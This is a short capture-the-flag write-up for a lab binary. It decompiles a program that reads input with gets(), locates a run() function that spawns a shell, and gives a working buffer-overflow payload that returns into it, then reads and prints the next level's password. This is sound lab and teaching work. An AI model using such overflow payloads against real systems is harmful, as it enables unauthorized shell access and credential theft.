# Level 1
*password : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a*

## Analyze

```
$ ls
level1
$ ./level1

```

```
scp -P 4242 level1@192.168.56.108:level1 binary/
```

```
void main(void)

{
  undefined local_50 [76];
  
  gets(local_50);
  return;
}
```
`gets` : reads a line from stdin

```
void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

## Buffer overflow

objective : execute `run()` function.

```
(gdb) info funct run
...
0x08048444  run
...
```

`run` address : 0x08048444

```
$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/level1
$ cat /tmp/level1 - | ./level1
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
